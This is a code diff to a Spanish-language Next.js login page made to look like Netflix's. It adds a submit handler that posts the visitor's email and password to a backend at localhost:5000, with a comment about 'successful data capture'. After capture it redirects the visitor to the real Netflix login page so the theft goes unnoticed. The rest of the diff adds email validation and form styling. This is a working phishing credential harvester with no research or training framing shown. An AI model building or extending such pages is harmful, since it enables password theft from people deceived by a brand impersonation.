@@ -6,6 +6,27 @@ import Link from "next/link"
 
 export default function LoginPage() {
   const [loginMethod, setLoginMethod] = useState<"password" | "code">("password")
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    try {
+      // Send data to backend
+      const response = await fetch('http://localhost:5000/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password }),
+      });
+      
+      if (response.ok) {
+        // Redirect to real Netflix after successful data capture
+        window.location.href = 'https://www.netflix.com/login';
+      }
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  };
 
   return (
     <div className="min-h-screen bg-black text-white">
@@ -30,22 +51,38 @@ export default function LoginPage() {
 
           {loginMethod === "password" ? (
             /* Password Login Form */
-            <div className="space-y-4">
-              <div>
-                <input
-                  type="text"
-                  placeholder="Email o número de celular"
-                  className="w-full rounded bg-[#575454]/30 border border-[#5E5E5E] p-4 text-white  focus:bg-[#454545]/30 focus:border-red-600"
-                />
-              </div>
+            <form onSubmit={handleSubmit} className="space-y-4">
+                <div>
+                  <input
+                    type="email"
+                    placeholder="Email o número de celular"
+                    className="w-full rounded bg-[#575454]/30 border border-[#5E5E5E] p-4 text-white focus:bg-[#454545]/30 focus:border-red-600"
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value)}
+                    onBlur={(e) => {
+                    const isValid = /[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(e.target.value);
+                    e.target.setCustomValidity(isValid ? "" : "Email inválido");
+                    }}
+                    pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
+                    required
+                  />
+                  {email && !/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(email) && (
+                    <p className="text-[#e50914] text-xs mt-1 ml-1">
+                    Por favor ingresa un correo electrónico válido
+                    </p>
+                  )}
+                </div>
               <div>
                 <input
                   type="password"
                   placeholder="Contraseña"
                   className="w-full rounded bg-[#575454]/30 border border-[#5E5E5E] p-4 text-white  focus:bg-[#454545]/30 focus:border-red-600"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  required
                 />
               </div>
-              <button className="w-full rounded bg-[#e50914] p-3 font-bold text-white hover:bg-[#f40612]">
+              <button type="submit" className="w-full rounded bg-[#e50914] p-3 font-bold text-white hover:bg-[#964f4f]">
                 Iniciar sesión
               </button>
 
@@ -89,7 +126,7 @@ export default function LoginPage() {
                   Más info.
                 </Link>
               </div>
-            </div>
+            </form>
           ) : (
             /* Code Login Form */
             <div className="space-y-4">
